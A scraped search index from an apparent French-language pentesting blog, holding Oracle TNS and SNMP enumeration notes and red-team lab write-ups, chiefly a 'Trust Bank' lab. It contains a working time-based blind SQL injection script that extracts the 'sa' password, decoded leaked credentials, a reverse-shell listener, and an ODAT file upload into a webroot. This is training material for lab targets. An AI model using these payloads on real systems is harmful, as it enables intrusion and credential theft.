l\u0026rsquo;accès des utilisateurs avec l\u0026rsquo;accès juste-à-temps et juste-assez-suffisant (JIT/JEA), les politiques adaptatives basées sur les risques et la protection des données.\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/enumeration/enumeration---azure/","summary":"","title":""},{"content":"Le serveur Oracle Transparent Network Substrate( TNS) est un protocole de communication qui facilite la communication entre les bases de données et les applications Oracle sur les réseaux.\nAvant de pouvoir énumérer l\u0026rsquo;écouteur TNS et interagir avec lui, nous devons télécharger quelques paquets et outils\nwget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip sudo mkdir -p /opt/oracle sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH export PATH=$LD_LIBRARY_PATH:$PATH source ~/.bashrc git clone https://github.com/quentinhardy/odat.git cd odat/ pip install python-libnmap git submodule init git submodule update pip3 install cx_Oracle sudo apt-get install python3-scapy -y sudo pip3 install colorlog termcolor passlib python-libnmap sudo apt-get install build-essential libgmp-dev -y pip3 install pycryptodome ./odat.py -h # si l\u0026#39;instalation a reuissi Oracle Database Attacking Tool ( ODAT) est un outil de test d\u0026rsquo;intrusion open source écrit en Python et conçu pour recenser et exploiter les vulnérabilités des bases de données Oracle. Il permet d\u0026rsquo;identifier et d\u0026rsquo;exploiter diverses failles de sécurité dans les bases de données Oracle, notamment l\u0026rsquo;injection SQL, l\u0026rsquo;exécution de code à distance et l\u0026rsquo;élévation de privilèges.\nBrute force SID sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute ./odat.py all -s 10.129.204.235 SQLplus pour se connecter a la bd\nsqlplus username/password@10.129.204.235/XE Si vous rencontrez l\u0026rsquo;erreur suivante sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory, veuillez exécuter ce qui suit, extrait d\u0026rsquo; ici .\nsudo sh -c \u0026#34;echo /usr/lib/oracle/12.2/client64/lib \u0026gt; /etc/ld.so.conf.d/oracle-instantclient.conf\u0026#34;;sudo ldconfig sqlplus username/password@10.129.204.235/XE as sysdba SQL\u0026gt; select * from user_role_privs; SQL\u0026gt; select name, password from sys.user Telechargement de fichier\n./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\\\inetpub\\\\wwwroot testing.txt ./testing.txt https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985\n","permalink":"https://nyobemichel.me/posts/enumeration/enumeration---oracle-tns/","summary":"\u003cp\u003eLe serveur \u003ccode\u003eOracle Transparent Network Substrate\u003c/code\u003e( \u003ccode\u003eTNS\u003c/code\u003e) est un protocole de communication qui facilite la communication entre les bases de données et les applications Oracle sur les réseaux.\u003c/p\u003e\n\u003cp\u003eAvant de pouvoir énumérer l\u0026rsquo;écouteur TNS et interagir avec lui, nous devons télécharger quelques paquets et outils\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo mkdir -p /opt/oracle\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eLD_LIBRARY_PATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/opt/oracle/instantclient_21_4:\u003cspan class=\"nv\"\u003e$LD_LIBRARY_PATH\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003ePATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$LD_LIBRARY_PATH\u003c/span\u003e:\u003cspan class=\"nv\"\u003e$PATH\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003esource\u003c/span\u003e ~/.bashrc\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit clone https://github.com/quentinhardy/odat.git\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e odat/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epip install python-libnmap\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit submodule init\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit submodule update\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epip3 install cx_Oracle\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get install python3-scapy -y\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo pip3 install colorlog termcolor passlib python-libnmap\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get install build-essential libgmp-dev -y\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epip3 install pycryptodome\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./odat.py -h \u003cspan class=\"c1\"\u003e# si l\u0026#39;instalation a reuissi \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eOracle Database Attacking Tool ( \u003ccode\u003eODAT\u003c/code\u003e) est un outil de test d\u0026rsquo;intrusion open source écrit en Python et conçu pour recenser et exploiter les vulnérabilités des bases de données Oracle. Il permet d\u0026rsquo;identifier et d\u0026rsquo;exploiter diverses failles de sécurité dans les bases de données Oracle, notamment l\u0026rsquo;injection SQL, l\u0026rsquo;exécution de code à distance et l\u0026rsquo;élévation de privilèges.\u003c/p\u003e","title":""},{"content":"Simple Network Management Protocol SNMP a été créé pour surveiller les périphériques réseau. Ce protocole permet également de gérer les tâches de configuration et de modifier les paramètres à distance.\nPour l\u0026rsquo;empreinte SNMP, nous pouvons utiliser des outils tels que snmpwalk, onesixtyoneet braa. SnmpwalkIl permet d\u0026rsquo;interroger les OID avec leurs informations.\nsnmpwalk -v2c -c public 10.129.14.128 snmpwalk -v2c -c backup 10.129.109.205 Community: admin manager public private backup sudo apt install onesixtyone onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128 utiliser avec braa pour forcer les OID individuels et énumérer les informations qui se cachent derrière eux\nsudo apt install braa braa \u0026lt;community string\u0026gt;@\u0026lt;IP\u0026gt;:.1.3.6.* # Syntax braa public@10.129.14.128:.1.3.6.* ","permalink":"https://nyobemichel.me/posts/enumeration/enumeration---snmp/","summary":"\u003cp\u003e\u003ccode\u003eSimple Network Management Protocol\u003c/code\u003e SNMP a été créé pour surveiller les périphériques réseau. Ce protocole permet également de gérer les tâches de configuration et de modifier les paramètres à distance.\u003c/p\u003e\n\u003cp\u003ePour l\u0026rsquo;empreinte SNMP, nous pouvons utiliser des outils tels que \u003ccode\u003esnmpwalk\u003c/code\u003e, \u003ccode\u003eonesixtyone\u003c/code\u003eet \u003ccode\u003ebraa\u003c/code\u003e. \u003ccode\u003eSnmpwalk\u003c/code\u003eIl permet d\u0026rsquo;interroger les OID avec leurs informations.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esnmpwalk -v2c -c public 10.129.14.128\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esnmpwalk -v2c -c backup 10.129.109.205\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eCommunity:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eadmin\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emanager\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epublic\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eprivate\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebackup\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt install onesixtyone\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eonesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eutiliser avec \u003ca href=\"https://github.com/mteg/braa\"\u003ebraa\u003c/a\u003e pour forcer les OID individuels et énumérer les informations qui se cachent derrière eux\u003c/p\u003e","title":""},{"content":"","permalink":"https://nyobemichel.me/posts/formations/api-attack-and-defense/","summary":"","title":""},{"content":"SUMMUS: Extreme Red Teamer Lab https://extremeredlab.0x29a.it/redteamlabs\nEnumeration nmap nmap -sn 10.8.0.130/24\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-31 14:50 CEST Nmap scan report for 10.8.0.1 Host is up (0.10s latency). Nmap scan report for 10.8.0.34 Host is up (0.37s latency). Nmap scan report for 10.8.0.46 Host is up (0.38s latency). Nmap scan report for 10.8.0.130 Host is up. Nmap done: 256 IP addresses (4 hosts up) scanned in 35.63 seconds nmap -sV -sC 10.8.0.46 -v \u0026ndash;min-rate 1000 -Pn -T4 -p-\nnmap -sV -sC 10.8.0.34 -v \u0026ndash;min-rate 1000 -Pn -T4 -p-\nPORT STATE SERVICE VERSION 1716/tcp open tcpwrapped ","permalink":"https://nyobemichel.me/posts/labs/summus/","summary":"\u003cp\u003eSUMMUS: Extreme Red Teamer Lab\n\u003ca href=\"https://extremeredlab.0x29a.it/redteamlabs\"\u003ehttps://extremeredlab.0x29a.it/redteamlabs\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"enumeration\"\u003eEnumeration\u003c/h1\u003e\n\u003ch2 id=\"nmap\"\u003enmap\u003c/h2\u003e\n\u003cp\u003enmap -sn 10.8.0.130/24\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-31 14:50 CEST\nNmap scan report for 10.8.0.1\nHost is up (0.10s latency).\nNmap scan report for 10.8.0.34\nHost is up (0.37s latency).\nNmap scan report for 10.8.0.46\nHost is up (0.38s latency).\nNmap scan report for 10.8.0.130\nHost is up.\nNmap done: 256 IP addresses (4 hosts up) scanned in 35.63 seconds\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003enmap -sV -sC 10.8.0.46 -v  \u0026ndash;min-rate 1000 -Pn -T4 -p-\u003c/p\u003e","title":""},{"content":"In this Red Team exercise, students will simulate a financially motivated Advanced Persistent Threat (APT) attack against \u0026ldquo;Trust Bank,\u0026rdquo; aiming to compromise the branch manager’s email account and exfiltrate sensitive financial data including internal communications all while maintaining stealth to mimic real-world banking threats like FIN7. The Red Team will go through Initial Access, Privilege Escalation, Lateral Movement \u0026amp; Data Exfiltration.\nDescription To conduct a targeted cyber operation against “Trust Bank” with the primary goal of compromising the branch manager’s mailbox and exfiltrating sensitive financial data (e.g., customer records, transaction logs, internal communications). The operation will simulate a financially motivated Advanced Persistent Threat (APT) attack, leveraging advanced tradecraft to evade detection while achieving mission objectives.\nScope of Engagement: Target Primary Objective: Gain unauthorized mail access to the branch manager’s account. Secondary Objective: Extract sensitive data (PII, account details, internal memos). IP Range: 172.16.100.0/24 (Trust Bank’s internal network segment). Tactics \u0026amp; Techniques (Simulated APT Approach): Initial Access: Exploiting public-facing services. Privilege Escalation: Sensitive information disclosure Exploiting misconfigured service permissions. Lateral Movement: Weak protocol Implementation SSH Agent Abuse Data Exfiltration: Stealthy data compression \u0026amp; exfil via encrypted channels (DNS tunneling, HTTPS). Rules of Engagement (ROE): Avoid disruption: Do not crash systems or trigger incident response unnecessarily. Legal compliance: Operate under authorized red team agreements. Deliverables: Post-Compromise Report: Attack timeline \u0026amp; techniques used Security recommendations (patch weak credentials, MFA enforcement). [IMP] Flag present at the Bank Manager Mailbox ![[lab1.png]] Decouverte du reseaux Enumeration Nmap Scannons tous les hôtes actifs sur le réseau local 172.16.100.0/24 pour identifier les machines accessibles\nnmap 172.16.100.0/24 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 16:01 CEST Nmap scan report for 172.16.100.1 Host is up (0.22s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http Nmap scan report for 172.16.100.25 Host is up (0.20s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE 25/tcp open smtp 143/tcp open imap 993/tcp open imaps Nmap scan report for 172.16.100.70 Host is up (0.20s latency). Not shown: 999 closed tcp ports (reset) PORT STATE SERVICE 8080/tcp open http-proxy Nmap scan report for 172.16.100.98 Host is up (0.18s latency). Not shown: 994 closed tcp ports (reset) PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 1433/tcp open ms-sql-s 5000/tcp open upnp 5357/tcp open wsdapi Nmap scan report for 172.16.100.102 Host is up (0.21s latency). Not shown: 988 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl La commande a permis d’identifier 5 hôtes actifs sur le réseau 172.16.100.0/24. Cela signifie que ces machines ont répondu à des requêtes réseau et ont au moins un port ouvert.\n172.16.100.1 172.16.100.25 172.16.100.70 172.16.100.98 172.16.100.102 Machine 172.16.100.98 Enumeration PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM | ms-sql-info: | 172.16.100.98\\MSSQLSERVER: | Instance name: MSSQLSERVER | Version: | name: Microsoft SQL Server 2019 RTM | number: 15.00.2000.00 | Product: Microsoft SQL Server 2019 | Service pack level: RTM | Post-SP patches applied: false | TCP port: 1433 | Named pipe: \\\\172.16.100.98\\pipe\\sql\\query |_ Clustered: false | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Issuer: commonName=SSL_Self_Signed_Fallback | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2025-07-04T01:28:55 | Not valid after: 2055-07-04T01:28:55 | MD5: 6f59:6c52:3bde:7eb3:03f2:43c5:86d4:4db8 |_SHA-1: ddf4:261b:fdff:f390:48e6:d13e:73f7:3035:5943:231e |_ssl-date: 2025-07-25T08:52:56+00:00; -5h18m23s from scanner time. | ms-sql-ntlm-info: | 172.16.100.98\\MSSQLSERVER: | Target_Name: SQL-SRV | NetBIOS_Domain_Name: SQL-SRV | NetBIOS_Computer_Name: SQL-SRV | DNS_Domain_Name: SQL-Srv | DNS_Computer_Name: SQL-Srv |_ Product_Version: 10.0.20348 5000/tcp open http Werkzeug httpd 3.1.3 (Python 3.13.5) | http-methods: |_ Supported Methods: GET HEAD OPTIONS |_http-server-header: Werkzeug/3.1.3 Python/3.13.5 |_http-title: SRC BANK 5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Service Unavailable Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required |_clock-skew: mean: -5h18m23s, deviation: 0s, median: -5h18m23s | smb2-time: | date: 2025-07-25T08:52:49 |_ start_date: N/A Le scan révèle que l’hôte 172.16.100.98 expose plusieurs services critiques Windows, dont SMB et SQL Server 2019, ainsi que deux interfaces HTTP, ce qui en fait une cible potentielle pour une exploitation approfondie. la liste des ports ouverts : 135, 139, 445, 1433, 5000, 5357\nServeur Web je suis alle sur le site internet j\u0026rsquo;ai cree un compte je me suis connecte j\u0026rsquo;ai rien trouve\n![[Pasted image 20250725161630.png]]\nj\u0026rsquo;ai fais une analyse des sou-domaine j\u0026rsquo;ai rien trouve d\u0026rsquo;interressant ![[Pasted image 20250807140519.png]] apres la verification du code source j\u0026rsquo;ai trouve ceci\nhttp://172.16.100.98:5000/static/.env/Artifact_deployment.txt\n![[Pasted image 20250807140201.png]]\n[DEBUG] Injected credentials: usr: YWRtaW4ucmljaGFyZA== pss: QWRtaW5AU2VjdXJlOTk= Les identifiants injectés sont codés en Base64 :\nusr = admin.richard pss = Admin@Secure99 je me suis connecte avec ces identifiant ![[Pasted image 20250807140333.png]]\nBlind SQL injection Blind SQL injection is a type of SQL injection where the attacker does not receive an obvious response from the attacked database and instead reconstructs the database structure step-by-step by observing the behavior of the database server and the application J\u0026rsquo;ai inserer ' dans le formulaire et j\u0026rsquo;ai constate que l\u0026rsquo;input est succesible d\u0026rsquo;une attaque sql\n\u0026rsquo; IF EXISTS (SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = \u0026lsquo;users\u0026rsquo; AND column_name = \u0026lsquo;password_hash\u0026rsquo;) WAITFOR DELAY \u0026lsquo;0:0:10\u0026rsquo;\u0026ndash;\n![[Pasted image 20250807142357.png]]\nPython Code to Extract the \u0026ldquo;sa\u0026rdquo; Credentials from the table via Blind SQLi import requests import time\nurl = \u0026ldquo;http://172.16.100.98:5000/admin/dashboard\u0026rdquo;\n# Replace this with your session cookie session_cookie = { \u0026#34;session\u0026#34;: \u0026#34;eyJfcGVybWFuZW50Ijp0cnVlLCJsb2dpbl90aW1lIjoiMjAyNS0wOC0wN1QwMzo1MzoxNi41MDY0ODYiLCJ1c2VyX2lkIjoxN30.aJSFnQ.nunwVoFvyy0bKnab_aX1eV3FM2w\u0026#34; } DELAY_THRESHOLD = 4.5 # Target user and field target_user = \u0026#34;sa\u0026#34; target_field = \u0026#34;password_hash\u0026#34; charset = \u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$_!%^\u0026amp;*()-=+\u0026#34; # Result storage extracted = \u0026#34;\u0026#34; # How many characters of the field to extract MAX_LENGTH = 50 print(\u0026#34;[*] Starting time-based blind SQLi on authenticated endpoint...\\n\u0026#34;) for position in range(1, MAX_LENGTH + 1): found = False for char in charset: payload = ( f\u0026#34;\u0026#39; IF (SUBSTRING(CONVERT(varchar, (SELECT {target_field} FROM users \u0026#34; f\u0026#34;WHERE username = \u0026#39;{target_user}\u0026#39;)) COLLATE Latin1_General_CS_AS, {position}, 1) = \u0026#39;{char}\u0026#39;) \u0026#34; f\u0026#34;WAITFOR DELAY \u0026#39;0:0:5\u0026#39;--\u0026#34; ) print(f\u0026#34;[*] Testing position {position} with character: \u0026#39;{char}\u0026#39;\u0026#34;) try: start = time.time() r = requests.get(url, params={\u0026#39;search\u0026#39;: payload}, cookies=session_cookie) elapsed = time.time() - start print(f\u0026#34; → Response time: {elapsed:.2f} sec\u0026#34;) if elapsed \u0026gt; DELAY_THRESHOLD: extracted += char print(f\u0026#34;[+] Match at position {position}: \u0026#39;{char}\u0026#39; → {extracted}\\n\u0026#34;) found = True break except Exception as e: print(f\u0026#34;[!] Request error at position {position} with \u0026#39;{char}\u0026#39;: {e}\u0026#34;) time.sleep(2) if not found: print(f\u0026#34;[!] No match at position {position}. Assuming end of value.\u0026#34;) break print(f\u0026#34;\\n[✔] Extraction complete: {extracted}\u0026#34;) une attaque par injection SQL à l’aveugle (Blind SQL Injection), de type \u0026ldquo;time-based\u0026rdquo;, sur une application web.\n![[Pasted image 20250807182626.png]] sa:MSSqlServer@963\nnc -lvnp 443 listening on [any] 443 ... connect to [10.10.10.10] from (UNKNOWN) [192.168.10.101] 9876 hostname SQL-Srv PS C:\\Windows\\system32\u0026gt; Machine 172.16.100.70\nEnumeration Nmap sudo nmap -Pn -sU -p 161 172.16.100.70 PORT STATE SERVICE 161/udp open snmp ![[Pasted image 20250807184900.png]]\nsudo snmpwalk -v 2c -c public 172.16.100.70 iso.3.6.1.2.1.1.1.0 = STRING: \u0026#34;SNMP Service\u0026#34; iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10 iso.3.6.1.2.1.1.3.0 = Timeticks: (219627045) 25 days, 10:04:30.45 iso.3.6.1.2.1.1.4.0 = STRING: \u0026#34;Admin \u0026lt;dev@trust-bank.ad\u0026gt;\u0026#34; iso.3.6.1.2.1.1.5.0 = STRING: \u0026#34;Passed IP will be logged in the executable file, if sent via POST request.\u0026#34; iso.3.6.1.2.1.1.6.0 = STRING: \u0026#34;http://localhost:8080/submit -d \\\u0026#34;user=root\u0026amp;ip=\u0026lt;\u0026gt;\u0026amp;port=\u0026lt;\u0026gt;\\\u0026#34;,\u0026#34; iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1 iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1 iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1 iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1 iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1 iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49 iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50 iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4 iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3 iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92 iso.3.6.1.2.1.1.9.1.3.1 = STRING: \u0026#34;The SNMP Management Architecture MIB.\u0026#34; iso.3.6.1.2.1.1.9.1.3.2 = STRING: \u0026#34;The MIB for Message Processing and Dispatching.\u0026#34; iso.3.6.1.2.1.1.9.1.3.3 = STRING: \u0026#34;The management information definitions for the SNMP User-based Security Model.\u0026#34; iso.3.6.1.2.1.1.9.1.3.4 = STRING: \u0026#34;The MIB module for SNMPv2 entities\u0026#34; iso.3.6.1.2.1.1.9.1.3.5 = STRING: \u0026#34;View-based Access Control Model for SNMP.\u0026#34; iso.3.6.1.2.1.1.9.1.3.6 = STRING: \u0026#34;The MIB module for managing TCP implementations\u0026#34; iso.3.6.1.2.1.1.9.1.3.7 = STRING: \u0026#34;The MIB module for managing UDP implementations\u0026#34; iso.3.6.1.2.1.1.9.1.3.8 = STRING: \u0026#34;The MIB module for managing IP and ICMP implementations\u0026#34; iso.3.6.1.2.1.1.9.1.3.9 = STRING: \u0026#34;The MIB modules for managing SNMP Notification, plus filtering.\u0026#34; iso.3.6.1.2.1.1.9.1.3.10 = STRING: \u0026#34;The MIB module for logging SNMP Notifications.\u0026#34; iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (0) 0:00:00.00 iso.3.6.1.2.1.25.1.1.0 = Timeticks: (228143547) 26 days, 9:43:55.47 iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E9 08 07 11 09 13 00 2B 05 1E iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216 iso.3.6.1.2.1.25.1.4.0 = STRING: \u0026#34;BOOT_IMAGE=/boot/vmlinuz-6.8.0-41-generic root=UUID=419ff7ed-938c-4d3b-b665-bf35581c8097 ro quiet splash vt.handoff=7 \u0026#34; iso.3.6.1.2.1.25.1.5.0 = Gauge32: 2 iso.3.6.1.2.1.25.1.6.0 = Gauge32: 277 iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0 iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MI curl -X POST http://172.16.100.70:8080/submit -d \u0026ldquo;user=root\u0026amp;ip=10.10.10.10\u0026amp;port=1234\u0026rdquo; Stored 10.10.10.10:1234 for root,\nNow run this from your machine: snmpwalk -v2c -c privatestring \u0026lt;target_ip\u0026gt; NET-SNMP-EXTEND-MIB::nsExtendOutput1Line\n","permalink":"https://nyobemichel.me/posts/labs/trust-bank-breach/","summary":"\u003cp\u003eIn this Red Team exercise, students will simulate a financially motivated Advanced Persistent Threat (APT) attack against \u0026ldquo;Trust Bank,\u0026rdquo; aiming to compromise the branch manager’s email account and exfiltrate sensitive financial data including internal communications all while maintaining stealth to mimic real-world banking threats like FIN7. The Red Team will go through Initial Access, Privilege Escalation, Lateral Movement \u0026amp; Data Exfiltration.\u003c/p\u003e\n\u003ch1 id=\"description\"\u003eDescription\u003c/h1\u003e\n\u003cp\u003eTo conduct a \u003cstrong\u003etargeted cyber operation\u003c/strong\u003e against “\u003cstrong\u003eTrust Bank\u003c/strong\u003e” with the primary goal of \u003cstrong\u003ecompromising the branch manager’s mailbox\u003c/strong\u003e and \u003cstrong\u003eexfiltrating sensitive financial data\u003c/strong\u003e (e.g., customer records, transaction logs, internal communications). The operation will simulate a \u003cstrong\u003efinancially motivated Advanced Persistent Threat (APT)\u003c/strong\u003e attack, leveraging advanced tradecraft to evade detection while achieving mission objectives.\u003c/p\u003e","title":""},{"content":"En tant que membre de l\u0026rsquo;équipe rouge de Secure Corp, votre mission est d\u0026rsquo;exploiter une vulnérabilité dans un plugin WordPress utilisé pour la gestion des ressources numériques. Cette faille peut permettre un accès distant non autorisé au serveur, vous permettant ainsi de compromettre le système en exécutant du code arbitraire.\nEnumeration Nmap version de wordpress WordPress 6.7.1\ncurl -s -X GET https://red.infinity.cyberwarfare.live/jf159070e9264f91970a7b64e17d775t/ | grep \u0026#39;\u0026lt;meta name=\u0026#34;generator\u0026#34;\u0026#39; \u0026lt;meta 